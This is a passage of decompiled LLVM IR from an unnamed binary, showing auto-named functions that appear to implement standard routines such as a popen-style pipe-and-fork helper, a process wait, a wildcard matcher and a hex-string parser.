  %stack_var_-44.1.lcssa = phi i32 [ 0, %dec_label_pc_8ec0 ], [ %stack_var_-44.132, %dec_label_pc_8ef8 ], [ %stack_var_-44.0, %dec_label_pc_9264 ]
  %v2_9284 = icmp eq i32* %arg1, null
  br i1 %v2_9284, label %dec_label_pc_929c, label %dec_label_pc_928c

dec_label_pc_928c:                                ; preds = %dec_label_pc_9280
  %v2_9290 = load i32, i32* %arg1, align 4
  %v3_9298 = inttoptr i32 %v2_9290 to i8*
  store i8 0, i8* %v3_9298, align 1
  br label %dec_label_pc_929c

dec_label_pc_929c:                                ; preds = %dec_label_pc_9280, %dec_label_pc_928c
  ret i32 %stack_var_-44.1.lcssa

; uselistorder directives
  uselistorder i8* %stack_var_-32.4, { 1, 0 }
  uselistorder i8* %stack_var_-32.1.lcssa, { 12, 11, 9, 7, 5, 3, 1, 10, 8, 6, 4, 2, 0 }
  uselistorder i32 %stack_var_-52.0.lcssa, { 1, 2, 3, 4, 5, 0 }
  uselistorder i8* %stack_var_-32.0.lcssa, { 1, 0, 2, 3 }
  uselistorder i32 %stack_var_-48.0.lcssa, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_8f60, { 1, 0 }
  uselistorder i32 %stack_var_-48.0.ph, { 1, 0 }
  uselistorder i8* %v5_8f00, { 2, 0, 1, 3, 4 }
  uselistorder i32 %stack_var_-44.132, { 0, 8, 7, 1, 2, 3, 4, 5, 6 }
  uselistorder i32 %stack_var_-36.133, { 13, 0, 11, 12, 9, 10, 7, 8, 5, 6, 3, 4, 1, 2 }
  uselistorder i32 %stack_var_-32.4.in34, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-18, { 1, 0 }
  uselistorder i32 (i32*, i32)* @function_8adc, { 4, 0, 1, 2, 3 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32)* @function_8cd4, { 0, 3, 2, 1 }
  uselistorder i32 (i32, i8*, i32, i32, i32)* @function_8b4c, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_929c, { 1, 0 }
  uselistorder label %dec_label_pc_9280, { 1, 0, 2 }
  uselistorder label %dec_label_pc_9264, { 7, 5, 0, 6, 1, 2, 3, 4 }
  uselistorder label %dec_label_pc_9244, { 1, 0 }
  uselistorder label %dec_label_pc_9028, { 1, 0 }
  uselistorder label %dec_label_pc_8fe0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8fd0, { 1, 0 }
  uselistorder label %dec_label_pc_8f5c, { 1, 0 }
  uselistorder label %dec_label_pc_8ee8, { 1, 0 }
}

define i32 @function_92b4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_92b4:
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  store i32 %arg2, i32* %stack_var_-12, align 4
  store i32 37572, i32* %stack_var_-20, align 4
  %v2_92c0 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_92c0, i32* @fp, align 4
  %v4_92cc = ptrtoint i32* %stack_var_-12 to i32
  %v4_92e0 = call i32 @function_8ec0(i32* null, i32 %arg1, i32 %v4_92cc)
  ret i32 %v4_92e0

; uselistorder directives
  uselistorder i32* %stack_var_-20, { 1, 0 }
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @function_92f8(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_92f8:
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  store i32 %arg3, i32* %stack_var_-8, align 4
  %v3_9300 = load i32, i32* @fp, align 4
  store i32 37640, i32* %stack_var_-16, align 4
  %v2_9304 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %v2_9304, i32* @fp, align 4
  store i32 %arg1, i32* %stack_var_-44, align 4
  %v2_9310 = ptrtoint i32* %stack_var_-8 to i32
  %v4_9328 = call i32 @function_8ec0(i32* nonnull %stack_var_-44, i32 %arg2, i32 %v2_9310)
  store i32 %v3_9300, i32* @fp, align 4
  ret i32 %v4_9328

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @function_9340(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_9340:
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v6_9344 = load i32, i32* @r2, align 4
  store i32 %v6_9344, i32* %stack_var_-8, align 4
  %v3_9348 = load i32, i32* @fp, align 4
  store i32 37712, i32* %stack_var_-16, align 4
  %v2_934c = ptrtoint i32* %stack_var_-16 to i32
  store i32 %v2_934c, i32* @fp, align 4
  %v1_935c = call i32 @function_14ccc(i32 2048)
  store i32 %v1_935c, i32* %stack_var_-44, align 4
  store i32 2048, i32* @r2, align 4
  %v2_9378 = inttoptr i32 %v1_935c to i8*
  %v3_9378 = call i32 @function_13ed0(i8* %v2_9378, i32 0)
  %v2_9384 = ptrtoint i32* %stack_var_-8 to i32
  %v4_93a4 = call i32 @function_8ec0(i32* nonnull %stack_var_-44, i32 %arg2, i32 %v2_9384)
  store i32 %v1_935c, i32* @r0, align 4
  %v0_93ac = call i32 @function_13f70()
  %v2_93bc = add i32 %v0_93ac, %v1_935c
  %v3_93c4 = inttoptr i32 %v2_93bc to i8*
  store i8 10, i8* %v3_93c4, align 1
  store i32 %v1_935c, i32* @r0, align 4
  %v0_93cc = call i32 @function_13f70()
  %v4_93e4 = call i32 @function_149c8(i32 %arg1, i32 %v1_935c, i32 %v0_93cc, i32 16384)
  store i32 %v1_935c, i32* @r0, align 4
  %v0_93f4 = call i32 @function_15850()
  store i32 %v3_9348, i32* @fp, align 4
  ret i32 %v4_93e4

; uselistorder directives
  uselistorder i32 %v1_935c, { 1, 2, 3, 0, 4, 5, 6 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @function_940c(i32 %arg1, i8* %arg2) local_unnamed_addr {
dec_label_pc_940c:
  %tmp = ptrtoint i8* %arg2 to i32
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_9410 = load i32, i32* @fp, align 4
  store i32 37912, i32* %stack_var_-4, align 4
  %v2_9414 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_9414, i32* @fp, align 4
  %v2_9428 = load i8, i8* %arg2, align 1
  %v7_942c = icmp eq i8 %v2_9428, 114
  br i1 %v7_942c, label %dec_label_pc_9444, label %dec_label_pc_9434

dec_label_pc_9434:                                ; preds = %dec_label_pc_940c
  %v2_9438 = load i8, i8* %arg2, align 1
  %v7_943c = icmp eq i8 %v2_9438, 119
  br i1 %v7_943c, label %dec_label_pc_9444, label %dec_label_pc_9458

dec_label_pc_9444:                                ; preds = %dec_label_pc_9434, %dec_label_pc_940c
  %v1_9448 = add i32 %tmp, 1
  %v1_944c = inttoptr i32 %v1_9448 to i8*
  %v2_944c = load i8, i8* %v1_944c, align 1
  %v2_9450 = icmp eq i8 %v2_944c, 0
  br i1 %v2_9450, label %dec_label_pc_9464, label %dec_label_pc_9458

dec_label_pc_9458:                                ; preds = %dec_label_pc_9434, %dec_label_pc_9444
  br label %dec_label_pc_9670

dec_label_pc_9464:                                ; preds = %dec_label_pc_9444
  %v2_9464 = ptrtoint i32* %stack_var_-32 to i32
  %v1_946c = call i32 @function_12614(i32 %v2_9464)
  store i32 %v1_946c, i32* @r0, align 4
  %v1_9474 = icmp slt i32 %v1_946c, 0
  br i1 %v1_9474, label %dec_label_pc_947c, label %dec_label_pc_9488

dec_label_pc_947c:                                ; preds = %dec_label_pc_9464
  br label %dec_label_pc_9670

dec_label_pc_9488:                                ; preds = %dec_label_pc_9464
  %v2_948c = load i32, i32* @global_var_308ac.18, align 4
  %v2_9490 = icmp eq i32 %v2_948c, 0
  br i1 %v2_9490, label %dec_label_pc_9498, label %dec_label_pc_9518

dec_label_pc_9498:                                ; preds = %dec_label_pc_9488
  %v0_9498 = call i32 @function_1280c()
  %v5_94ac = icmp sgt i32 %v0_9498, 0
  br i1 %v5_94ac, label %dec_label_pc_94bc, label %dec_label_pc_94b0

dec_label_pc_94b0:                                ; preds = %dec_label_pc_9498
  br label %dec_label_pc_9670

dec_label_pc_94bc:                                ; preds = %dec_label_pc_9498
  %v3_94c0 = mul i32 %v0_9498, 4
  %v1_94c8 = call i32 @function_14ccc(i32 %v3_94c0)
  store i32 %v1_94c8, i32* @global_var_308ac.18, align 4
  %v2_94e4 = icmp eq i32 %v1_94c8, 0
  br i1 %v2_94e4, label %dec_label_pc_94ec, label %dec_label_pc_94f8

dec_label_pc_94ec:                                ; preds = %dec_label_pc_94bc
  br label %dec_label_pc_9670

dec_label_pc_94f8:                                ; preds = %dec_label_pc_94bc
  store i32 %v3_94c0, i32* @r2, align 4
  %v2_9514 = inttoptr i32 %v1_94c8 to i8*
  %v3_9514 = call i32 @function_13ed0(i8* %v2_9514, i32 0)
  store i32 %v3_9514, i32* @r0, align 4
  br label %dec_label_pc_9518

dec_label_pc_9518:                                ; preds = %dec_label_pc_9488, %dec_label_pc_94f8
  %v0_9518 = call i32 @function_12540()
  %v7_9530 = icmp eq i32 %v0_9518, -1
  br i1 %v7_9530, label %dec_label_pc_9548, label %dec_label_pc_9538

dec_label_pc_9538:                                ; preds = %dec_label_pc_9518
  %v2_953c = icmp eq i32 %v0_9518, 0
  br i1 %v2_953c, label %dec_label_pc_956c, label %dec_label_pc_960c

dec_label_pc_9548:                                ; preds = %dec_label_pc_9518
  %v3_9548 = load i32, i32* %stack_var_-32, align 4
  %v1_9550 = call i32 @function_12a98(i32 %v3_9548)
  %v1_955c = call i32 @function_12a98(i32 %tmp3)
  br label %dec_label_pc_9670

dec_label_pc_956c:                                ; preds = %dec_label_pc_9538
  %v3_9570 = load i8, i8* %arg2, align 1
  %v7_9574 = icmp eq i8 %v3_9570, 114
  br i1 %v7_9574, label %dec_label_pc_957c, label %dec_label_pc_95b4

dec_label_pc_957c:                                ; preds = %dec_label_pc_956c
  %v7_9580 = icmp eq i32 %tmp3, 1
  br i1 %v7_9580, label %dec_label_pc_95a4, label %dec_label_pc_9588

dec_label_pc_9588:                                ; preds = %dec_label_pc_957c
  %v4_9594 = call i32 @function_12580(i32 %tmp3, i32 1, i32 %tmp)
  %v1_95a0 = call i32 @function_12a98(i32 %tmp3)
  br label %dec_label_pc_95a4

dec_label_pc_95a4:                                ; preds = %dec_label_pc_957c, %dec_label_pc_9588
  %v3_95a4 = load i32, i32* %stack_var_-32, align 4
  %v1_95ac = call i32 @function_12a98(i32 %v3_95a4)
  br label %dec_label_pc_95e8

dec_label_pc_95b4:                                ; preds = %dec_label_pc_956c
  %v3_95b4 = load i32, i32* %stack_var_-32, align 4
  %v2_95b8 = icmp eq i32 %v3_95b4, 0
  br i1 %v2_95b8, label %dec_label_pc_95dc, label %dec_label_pc_95c0

dec_label_pc_95c0:                                ; preds = %dec_label_pc_95b4
  %v4_95cc = call i32 @function_12580(i32 %v3_95b4, i32 0, i32 %tmp)
  %v3_95d0 = load i32, i32* %stack_var_-32, align 4
  %v1_95d8 = call i32 @function_12a98(i32 %v3_95d0)
  br label %dec_label_pc_95dc

dec_label_pc_95dc:                                ; preds = %dec_label_pc_95b4, %dec_label_pc_95c0
  %v1_95e4 = call i32 @function_12a98(i32 %tmp3)
  br label %dec_label_pc_95e8

dec_label_pc_95e8:                                ; preds = %dec_label_pc_95a4, %dec_label_pc_95dc
  store i32 ptrtoint ([8 x i8]* @global_var_20ee0.20 to i32), i32* @r0, align 4
  %v8_9600 = call i32 @function_16c80(i32 ptrtoint ([8 x i8]* @global_var_20ee0.20 to i32), i32 ptrtoint ([3 x i8]* @global_var_20908.22 to i32), i32 ptrtoint ([3 x i8]* @global_var_20ee8.24 to i32), i32 %arg1, i32 0)
  %v1_9608 = call i32 @function_12a34(i32 127)
  br label %dec_label_pc_960c

dec_label_pc_960c:                                ; preds = %dec_label_pc_9538, %dec_label_pc_95e8
  %v2_9610 = load i8, i8* %arg2, align 1
  %v7_9614 = icmp eq i8 %v2_9610, 114
  br i1 %v7_9614, label %dec_label_pc_961c, label %dec_label_pc_9634

dec_label_pc_961c:                                ; preds = %dec_label_pc_960c
  %v3_961c = load i32, i32* %stack_var_-32, align 4
  %v1_962c = call i32 @function_12a98(i32 %tmp3)
  br label %dec_label_pc_9648

dec_label_pc_9634:                                ; preds = %dec_label_pc_960c
  %v3_963c = load i32, i32* %stack_var_-32, align 4
  %v1_9644 = call i32 @function_12a98(i32 %v3_963c)
  br label %dec_label_pc_9648

dec_label_pc_9648:                                ; preds = %dec_label_pc_961c, %dec_label_pc_9634
  %stack_var_-40.0 = phi i32 [ %v3_961c, %dec_label_pc_961c ], [ %tmp3, %dec_label_pc_9634 ]
  %v3_964c = mul i32 %stack_var_-40.0, 4
  %v2_9658 = load i32, i32* @global_var_308ac.18, align 4
  %v2_965c = add i32 %v2_9658, %v3_964c
  %v2_9664 = inttoptr i32 %v2_965c to i32*
  store i32 %v0_9518, i32* %v2_9664, align 4
  br label %dec_label_pc_9670

dec_label_pc_9670:                                ; preds = %dec_label_pc_9548, %dec_label_pc_94ec, %dec_label_pc_94b0, %dec_label_pc_947c, %dec_label_pc_9458, %dec_label_pc_9648
  %stack_var_-44.0 = phi i32 [ -1, %dec_label_pc_947c ], [ -1, %dec_label_pc_94ec ], [ -1, %dec_label_pc_9548 ], [ %stack_var_-40.0, %dec_label_pc_9648 ], [ -1, %dec_label_pc_94b0 ], [ -1, %dec_label_pc_9458 ]
  store i32 %v3_9410, i32* @fp, align 4
  ret i32 %stack_var_-44.0

; uselistorder directives
  uselistorder i32 %stack_var_-40.0, { 1, 0 }
  uselistorder i32 %v0_9518, { 1, 2, 0 }
  uselistorder i32 %v3_94c0, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %tmp3, { 0, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 (i32, i32, i32)* @function_12580, { 1, 0 }
  uselistorder i8* %arg2, { 1, 2, 0, 3, 4 }
  uselistorder label %dec_label_pc_9670, { 5, 0, 1, 2, 3, 4 }
  uselistorder label %dec_label_pc_9648, { 1, 0 }
  uselistorder label %dec_label_pc_960c, { 1, 0 }
  uselistorder label %dec_label_pc_95e8, { 1, 0 }
  uselistorder label %dec_label_pc_95dc, { 1, 0 }
  uselistorder label %dec_label_pc_95a4, { 1, 0 }
  uselistorder label %dec_label_pc_9518, { 1, 0 }
  uselistorder label %dec_label_pc_9458, { 1, 0 }
}

define i32 @function_9694(i32 %arg1) local_unnamed_addr {
dec_label_pc_9694:
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v2_96ac = load i32, i32* @global_var_308ac.18, align 4
  %v2_96b0 = icmp eq i32 %v2_96ac, 0
  br i1 %v2_96b0, label %dec_label_pc_9804, label %dec_label_pc_96b8

dec_label_pc_96b8:                                ; preds = %dec_label_pc_9694
  %v3_96bc = mul i32 %arg1, 4
  %v2_96cc = add i32 %v2_96ac, %v3_96bc
  %v1_96d0 = inttoptr i32 %v2_96cc to i32*
  %v2_96d0 = load i32, i32* %v1_96d0, align 4
  %v2_96d4 = icmp eq i32 %v2_96d0, 0
  br i1 %v2_96d4, label %dec_label_pc_9804, label %dec_label_pc_96e8

dec_label_pc_96e8:                                ; preds = %dec_label_pc_96b8
  %v1_96ec = call i32 @function_12a98(i32 %arg1)
  %v2_96f0 = ptrtoint i32* %stack_var_-36 to i32
  %v2_96f8 = call i32 @function_14b1c(i32* nonnull %stack_var_-36)
  store i32 %v2_96f0, i32* @r0, align 4
  %v2_9708 = call i32 @function_14ad8(i32 %v2_96f0, i32 2)
  store i32 %v2_96f0, i32* @r0, align 4
  %v2_9718 = call i32 @function_14ad8(i32 %v2_96f0, i32 3)
  store i32 %v2_96f0, i32* @r0, align 4
  %v2_9728 = call i32 @function_14ad8(i32 %v2_96f0, i32 1)
  %v2_9730 = ptrtoint i32* %stack_var_-28 to i32
  %v4_973c = call i32 @function_12a60(i32 0, i32 %v2_96f0, i32 %v2_9730, i32 %v2_96f0)
  %v2_975c = ptrtoint i32* %stack_var_-40 to i32
  br label %dec_label_pc_9740

dec_label_pc_9740:                                ; preds = %dec_label_pc_9784, %dec_label_pc_96e8
  %v2_9750 = load i32, i32* @global_var_308ac.18, align 4
  %v2_9754 = add i32 %v2_9750, %v3_96bc
  %v1_9758 = inttoptr i32 %v2_9754 to i32*
  %v2_9758 = load i32, i32* %v1_9758, align 4
  store i32 %v2_9758, i32* @r0, align 4
  store i32 %v2_975c, i32* @r1, align 4
  %v3_976c = call i32 @function_12714(i32 %v2_9758, i32 %v2_975c, i32 0)
  %v3_977c = icmp eq i32 %v3_976c, -1
  %v8_977c = icmp eq i32 %v3_976c, -1
  br i1 %v3_977c, label %dec_label_pc_9784, label %dec_label_pc_9798

dec_label_pc_9784:                                ; preds = %dec_label_pc_9740
  %v0_9784 = call i32 @function_12b24()
  %v1_978c = inttoptr i32 %v0_9784 to i32*
  %v2_978c = load i32, i32* %v1_978c, align 4
  %v7_9790 = icmp eq i32 %v2_978c, 4
  br i1 %v7_9790, label %dec_label_pc_9740, label %dec_label_pc_9798

dec_label_pc_9798:                                ; preds = %dec_label_pc_9740, %dec_label_pc_9784
  %v4_97a8 = call i32 @function_12a60(i32 2, i32 %v2_9730, i32 0, i32 %v2_9730)
  %v3_97b0 = mul i32 %tmp6, 4
  %v2_97bc = load i32, i32* @global_var_308ac.18, align 4
  %v2_97c0 = add i32 %v2_97bc, %v3_97b0
  %v2_97c8 = inttoptr i32 %v2_97c0 to i32*
  store i32 0, i32* %v2_97c8, align 4
  br i1 %v8_977c, label %dec_label_pc_9804, label %dec_label_pc_97d8

dec_label_pc_97d8:                                ; preds = %dec_label_pc_9798
  %v3_97d8 = load i32, i32* %stack_var_-40, align 4
  %v1_97e4 = and i32 %v3_97d8, 65280
  %v3_97e81 = udiv i32 %v1_97e4, 256
  br label %dec_label_pc_9804

dec_label_pc_9804:                                ; preds = %dec_label_pc_97d8, %dec_label_pc_9798, %dec_label_pc_9694, %dec_label_pc_96b8
  %storemerge = phi i32 [ -1, %dec_label_pc_96b8 ], [ -1, %dec_label_pc_9694 ], [ %v3_97e81, %dec_label_pc_97d8 ], [ -1, %dec_label_pc_9798 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v2_975c, { 1, 0 }
  uselistorder i32 %v2_9730, { 1, 0, 2 }
  uselistorder i32 %v2_96f0, { 0, 1, 3, 2, 5, 4, 7, 6 }
  uselistorder i32 %v3_96bc, { 1, 0 }
  uselistorder i32 (i32, i32)* @function_14ad8, { 2, 1, 0 }
  uselistorder i32* @global_var_308ac.18, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_9804, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_9798, { 1, 0 }
}

define i32 @function_981c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_981c:
  br label %dec_label_pc_988c

dec_label_pc_984c:                                ; preds = %dec_label_pc_989c
  %v1_9868 = call i32 @function_127d8(i32 %arg3)
  %v1_9878 = add nuw i32 %storemerge25, 1
  %v7_9884 = icmp eq i32 %v1_9868, 1
  br i1 %v7_9884, label %dec_label_pc_988c, label %dec_label_pc_98bc

dec_label_pc_988c:                                ; preds = %dec_label_pc_981c, %dec_label_pc_984c
  %storemerge25 = phi i32 [ 0, %dec_label_pc_981c ], [ %v1_9878, %dec_label_pc_984c ]
  %v6_9898 = icmp slt i32 %storemerge25, %arg2
  br i1 %v6_9898, label %dec_label_pc_989c, label %dec_label_pc_98bc

dec_label_pc_989c:                                ; preds = %dec_label_pc_988c
  %v2_98a8 = add i32 %storemerge25, %arg1
  %v1_98ac = add i32 %v2_98a8, -1
  %v1_98b0 = inttoptr i32 %v1_98ac to i8*
  %v2_98b0 = load i8, i8* %v1_98b0, align 1
  %v7_98b4 = icmp eq i8 %v2_98b0, 10
  br i1 %v7_98b4, label %dec_label_pc_98bc, label %dec_label_pc_984c

dec_label_pc_98bc:                                ; preds = %dec_label_pc_989c, %dec_label_pc_988c, %dec_label_pc_984c
  %stack_var_-24.0.lcssa = phi i32 [ 1, %dec_label_pc_989c ], [ 1, %dec_label_pc_988c ], [ %v1_9868, %dec_label_pc_984c ]
  %v2_98c0 = icmp eq i32 %stack_var_-24.0.lcssa, 0
  %storemerge3 = select i1 %v2_98c0, i32 0, i32 %arg1
  ret i32 %storemerge3

; uselistorder directives
  uselistorder i32 %v1_9868, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_988c, { 1, 0 }
}

define i32 @function_98f0(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_98f0:
  %tmp = ptrtoint i8* %arg1 to i32
  %v2_99442 = load i8, i8* %arg1, align 1
  %v2_99484 = icmp eq i8 %v2_99442, 0
  br i1 %v2_99484, label %dec_label_pc_995c, label %dec_label_pc_9950

dec_label_pc_9910:                                ; preds = %dec_label_pc_9950
  %v3_9914 = mul i32 %stack_var_-20.06, 16
  %v2_991c = load i8, i8* %stack_var_-28.05, align 1
  %v3_991c = zext i8 %v2_991c to i32
  %v4_9928 = mul nuw nsw i32 %v3_991c, 4
  %v5_9928 = add i32 %v4_9928, ptrtoint (i32* @global_var_20eec.27 to i32)
  %v6_9928 = inttoptr i32 %v5_9928 to i32*
  %v7_9928 = load i32, i32* %v6_9928, align 4
  %v2_992c = or i32 %v7_9928, %v3_9914
  %v1_9938 = add i32 %v4_99407, 1
  %v5_993c = inttoptr i32 %v1_9938 to i8*
  %v2_9944 = load i8, i8* %v5_993c, align 1
  %v2_9948 = icmp eq i8 %v2_9944, 0
  br i1 %v2_9948, label %dec_label_pc_995c, label %dec_label_pc_9950

dec_label_pc_9950:                                ; preds = %dec_label_pc_98f0, %dec_label_pc_9910
  %v4_99407 = phi i32 [ %v1_9938, %dec_label_pc_9910 ], [ %tmp, %dec_label_pc_98f0 ]
  %stack_var_-20.06 = phi i32 [ %v2_992c, %dec_label_pc_9910 ], [ 0, %dec_label_pc_98f0 ]
  %stack_var_-28.05 = phi i8* [ %v5_993c, %dec_label_pc_9910 ], [ %arg1, %dec_label_pc_98f0 ]
  %v1_9954 = icmp slt i32 %stack_var_-20.06, 0
  br i1 %v1_9954, label %dec_label_pc_995c, label %dec_label_pc_9910

dec_label_pc_995c:                                ; preds = %dec_label_pc_9910, %dec_label_pc_9950, %dec_label_pc_98f0
  %stack_var_-20.0.lcssa = phi i32 [ 0, %dec_label_pc_98f0 ], [ %v2_992c, %dec_label_pc_9910 ], [ %stack_var_-20.06, %dec_label_pc_9950 ]
  ret i32 %stack_var_-20.0.lcssa

; uselistorder directives
  uselistorder i32 %stack_var_-20.06, { 1, 2, 0 }
  uselistorder label %dec_label_pc_995c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_9950, { 1, 0 }
}

define i32 @function_9974(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_9974:
  %tmp = inttoptr i32 %arg2 to i8*
  %tmp8 = ptrtoint i8* %arg1 to i32
  %stack_var_-4 = alloca i32, align 4
  %v3_9978 = load i32, i32* @r4, align 4
  %v6_9978 = load i32, i32* @fp, align 4
  store i32 39296, i32* %stack_var_-4, align 4
  %v2_997c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_997c, i32* @fp, align 4
  %v2_9990 = load i8, i8* %arg1, align 1
  %v7_999c = icmp eq i8 %v2_9990, 42
  br i1 %v7_999c, label %dec_label_pc_99d0, label %dec_label_pc_99a4

dec_label_pc_99a4:                                ; preds = %dec_label_pc_9974
  %v7_99a8 = icmp eq i8 %v2_9990, 63
  br i1 %v7_99a8, label %dec_label_pc_9a40, label %dec_label_pc_99b0

dec_label_pc_99b0:                                ; preds = %dec_label_pc_99a4
  %v2_99b4 = icmp eq i8 %v2_9990, 0
  br i1 %v2_99b4, label %dec_label_pc_99c0, label %dec_label_pc_9a98

dec_label_pc_99c0:                                ; preds = %dec_label_pc_99b0
  %v2_99c4 = load i8, i8* %tmp, align 1
  %v3_99c4 = zext i8 %v2_99c4 to i32
  br label %dec_label_pc_9b0c

dec_label_pc_99d0:                                ; preds = %dec_label_pc_9974
  %v1_99d4 = add i32 %tmp8, 1
  %v3_99e0 = inttoptr i32 %v1_99d4 to i8*
  %v4_99e0 = call i32 @function_9974(i8* %v3_99e0, i32 %arg2)
  %v2_99e8 = icmp eq i32 %v4_99e0, 0
  br i1 %v2_99e8, label %dec_label_pc_9a2c, label %dec_label_pc_99f0

dec_label_pc_99f0:                                ; preds = %dec_label_pc_99d0
  %v2_99f4 = load i8, i8* %tmp, align 1
  %v2_99f8 = icmp eq i8 %v2_99f4, 0
  br i1 %v2_99f8, label %dec_label_pc_9a34, label %dec_label_pc_9a00

dec_label_pc_9a00:                                ; preds = %dec_label_pc_99f0
  %v1_9a04 = add i32 %arg2, 1
  %v4_9a10 = call i32 @function_9974(i8* nonnull %arg1, i32 %v1_9a04)
  %v2_9a18 = icmp eq i32 %v4_9a10, 0
  br i1 %v2_9a18, label %dec_label_pc_9a2c, label %dec_label_pc_9a34

dec_label_pc_9a2c:                                ; preds = %dec_label_pc_9a00, %dec_label_pc_99d0
  br label %dec_label_pc_9a34

dec_label_pc_9a34:                                ; preds = %dec_label_pc_99f0, %dec_label_pc_9a00, %dec_label_pc_9a2c
  %storemerge3 = phi i32 [ 0, %dec_label_pc_9a2c ], [ 1, %dec_label_pc_9a00 ], [ 1, %dec_label_pc_99f0 ]
  br label %dec_label_pc_9b0c

dec_label_pc_9a40:                                ; preds = %dec_label_pc_99a4
  %v2_9a44 = load i8, i8* %tmp, align 1
  %v2_9a48 = icmp eq i8 %v2_9a44, 0
  br i1 %v2_9a48, label %dec_label_pc_9a8c, label %dec_label_pc_9a50

dec_label_pc_9a50:                                ; preds = %dec_label_pc_9a40
  %v1_9a54 = add i32 %tmp8, 1
  %v1_9a5c = add i32 %arg2, 1
  %v2_9a68 = inttoptr i32 %v1_9a54 to i8*
  %v3_9a68 = call i32 @function_9974(i8* %v2_9a68, i32 %v1_9a5c)
  %v2_9a70 = icmp ne i32 %v3_9a68, 0
  %. = zext i1 %v2_9a70 to i32
  br label %dec_label_pc_9a8c

dec_label_pc_9a8c:                                ; preds = %dec_label_pc_9a50, %dec_label_pc_9a40
  %storemerge2 = phi i32 [ 1, %dec_label_pc_9a40 ], [ %., %dec_label_pc_9a50 ]
  br label %dec_label_pc_9b0c

dec_label_pc_9a98:                                ; preds = %dec_label_pc_99b0
  %v2_9a9c = load i8, i8* %arg1, align 1
  %v3_9a9c = zext i8 %v2_9a9c to i32
  %v1_9aa4 = call i32 @function_12af4(i32 %v3_9a9c)
  store i32 %v1_9aa4, i32* @r4, align 4
  %v2_9ab0 = load i8, i8* %tmp, align 1
  %v3_9ab0 = zext i8 %v2_9ab0 to i32
  %v1_9ab8 = call i32 @function_12af4(i32 %v3_9ab0)
  %v0_9ac0 = load i32, i32* @r4, align 4
  %v9_9ac0 = icmp eq i32 %v0_9ac0, %v1_9ab8
  br i1 %v9_9ac0, label %dec_label_pc_9ac8, label %dec_label_pc_9b04

dec_label_pc_9ac8:                                ; preds = %dec_label_pc_9a98
  %v1_9acc = add i32 %tmp8, 1
  %v1_9ad4 = add i32 %arg2, 1
  %v2_9ae0 = inttoptr i32 %v1_9acc to i8*
  %v3_9ae0 = call i32 @function_9974(i8* %v2_9ae0, i32 %v1_9ad4)
  %v2_9ae8 = icmp ne i32 %v3_9ae0, 0
  %.7 = zext i1 %v2_9ae8 to i32
  br label %dec_label_pc_9b04

dec_label_pc_9b04:                                ; preds = %dec_label_pc_9ac8, %dec_label_pc_9a98
  %storemerge = phi i32 [ 1, %dec_label_pc_9a98 ], [ %.7, %dec_label_pc_9ac8 ]
  br label %dec_label_pc_9b0c

dec_label_pc_9b0c:                                ; preds = %dec_label_pc_9a8c, %dec_label_pc_9a34, %dec_label_pc_99c0, %dec_label_pc_9b04
  %stack_var_-48.0 = phi i32 [ %storemerge3, %dec_label_pc_9a34 ], [ %storemerge2, %dec_label_pc_9a8c ], [ %v3_99c4, %dec_label_pc_99c0 ], [ %storemerge, %dec_label_pc_9b04 ]
  store i32 %v3_9978, i32* @r4, align 4
  store i32 %v6_9978, i32* @fp, align 4
  ret i32 %stack_var_-48.0

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i8* %tmp, { 0, 2, 3, 1 }
  uselistorder i32 %arg2, { 3, 2, 0, 1, 4 }
  uselistorder label %dec_label_pc_9b0c, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_9a34, { 2, 1, 0 }
}

define i32 @function_9b20(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_9b20:
  store i32 %arg1, i32* @r0, align 4
  %v1_9b40 = call i32 @function_14830(i32 %arg1)
  store i32 %v1_9b40, i32* %arg2, align 4
  %v3_9b58 = icmp eq i32 %v1_9b40, -1
  %. = zext i1 %v3_9b58 to i32
  ret i32 %.

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @function_9b88(i8* %arg1) local_unnamed_addr {
dec_label_pc_9b88:
  %r0.global-to-local = alloca i32, align 4
